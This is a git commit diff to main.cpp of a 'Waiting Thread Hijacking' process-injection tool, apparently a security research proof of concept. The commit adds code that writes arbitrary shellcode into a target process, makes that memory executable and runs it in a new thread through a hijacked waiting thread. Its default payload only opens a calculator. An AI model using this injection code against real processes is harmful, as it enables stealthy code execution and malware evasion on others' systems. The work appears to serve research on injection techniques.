bae6b7c8f4b412c04aec5927ef0fafc95c20bfb7
hasherezade <hasherezade@gmail.com>
2025-08-31 00:49:17 +0200

    [FEATURE] Allow to run passed shellcode in a new thread

--- main.cpp
+++ main.cpp
@@ -9,7 +9,7 @@
 
 DWORD g_WaitReason = WrQueue;
 
-BYTE* wrap_shellcode(IN BYTE* raw_shellcode, IN size_t raw_shellcode_size, OUT size_t& wrapped_shc_size)
+BYTE* wrap_shellcode1(IN BYTE* raw_shellcode, IN size_t raw_shellcode_size, OUT size_t& wrapped_shc_size)
 {
     if (!raw_shellcode_size) {
         return nullptr;
@@ -25,11 +25,38 @@ BYTE* wrap_shellcode(IN BYTE* raw_shellcode, IN size_t raw_shellcode_size, OUT s
     return full_shc;
 }
 
-inline bool execute_injection(DWORD processID, BYTE* shellcode_buf, size_t shellcode_size)
+BYTE* wrap_shellcode2(IN BYTE* raw_shellcode, IN size_t raw_shellcode_size, OUT size_t& wrapped_shc_size, LPVOID shellc2)
+{
+    if (!raw_shellcode_size) {
+        return nullptr;
+    }
+    const size_t full_size = sizeof(g_shellcode_stub) + sizeof(g_shellcode_create_thread);
+    BYTE* full_shc = (BYTE*)::calloc(full_size, 1);
+    if (!full_shc) {
+        return nullptr;
+    }
+    wrapped_shc_size = full_size;
+    ::memcpy(full_shc, g_shellcode_stub, sizeof(g_shellcode_stub));
+    ::memcpy(full_shc + sizeof(g_shellcode_stub), g_shellcode_create_thread, sizeof(g_shellcode_create_thread));
+
+    //fill address:
+    BYTE* pattern_ptr = full_shc + sizeof(g_shellcode_stub)+ 0xe9;
+    ::memcpy(pattern_ptr, &shellc2, sizeof(shellc2));
+    return full_shc;
+}
+
+inline LPVOID write_buffer_into_process(DWORD processID, BYTE* shellcode_buf, size_t shellcode_size)
 {
     LPVOID shellcodePtr = alloc_memory_in_process(processID, shellcode_size);
-    bool isOk = write_shc_into_process(processID, shellcodePtr, shellcode_buf, shellcode_size);
-    if (!isOk) return false;
+    if (write_shc_into_process(processID, shellcodePtr, shellcode_buf, shellcode_size)) {
+        return shellcodePtr;
+    }
+    return nullptr;
+}
+inline bool execute_injection(DWORD processID, BYTE* shellcode_buf, size_t shellcode_size)
+{
+    LPVOID shellcodePtr = write_buffer_into_process(processID, shellcode_buf, shellcode_size);
+    if (!shellcodePtr) return false;
     return run_injected(processID, (ULONG_PTR)shellcodePtr, shellcode_size, g_WaitReason);
 }
 
@@ -37,11 +64,13 @@ int main(int argc, char* argv[])
 {
     if (argc < 2) {
         std::cout << "Waiting Thread Hijacking. Target Wait Reason: " << KWAIT_REASON_TO_STRING(g_WaitReason) << "\n"
-            << "Arg <PID> [shellcode_file*]\n"
-            << "* - optional; requires shellcode with clean exit"
+            << "Arg <PID> [shellcode_file*] [new_thread*]\n"
+            << "* - optional; requires shellcode with clean exit\n"
+            << "* - optional: if not 0, the passed shellcode will be run in a new thread"
             << std::endl;
         return 0;
     }
+    int new_thread = 0;
     BYTE* payload = g_shellcode_pop_calc;
     size_t payload_size = sizeof(g_shellcode_pop_calc);
     if (argc > 2) {
@@ -52,6 +81,9 @@ int main(int argc, char* argv[])
             return (-1);
         }
         std::cout << "Using payload from file: " << filename << std::endl;
+    }
+    if (argc > 3) {
+        new_thread = loadInt(argv[3], false);
     }
     DWORD processID = loadInt(argv[1], false);
     if (!processID) {
@@ -64,9 +96,23 @@ int main(int argc, char* argv[])
         return 0;
     }
     CloseHandle(hProcess);
-
     size_t shellc_size = 0;
-    BYTE* shellc_buf = wrap_shellcode(payload, payload_size, shellc_size);
+    BYTE* shellc_buf = nullptr;
+
+    if (new_thread) {
+        std::cout << "The passed shellcode will run in a new thread\n";
+        LPVOID shellc2 = write_buffer_into_process(processID, payload, payload_size);
+        if (!protect_memory(processID, (LPVOID)shellc2, payload_size, PAGE_EXECUTE_READWRITE)) {
+            std::cerr << "Failed making Shc2 memory executable!\n";
+            return (-2);
+        }
+        std::cout << "Written Shellcode 2 at: " << std::hex << (ULONG_PTR)shellc2 << std::endl;
+        shellc_buf = wrap_shellcode2(payload, payload_size, shellc_size, shellc2);
+    }
+    else {
+        shellc_buf = wrap_shellcode1(payload, payload_size, shellc_size);
+    }
+
     int status = 0;
     if (execute_injection(processID, shellc_buf, shellc_size)) {
         std::cout << "Done!\n";
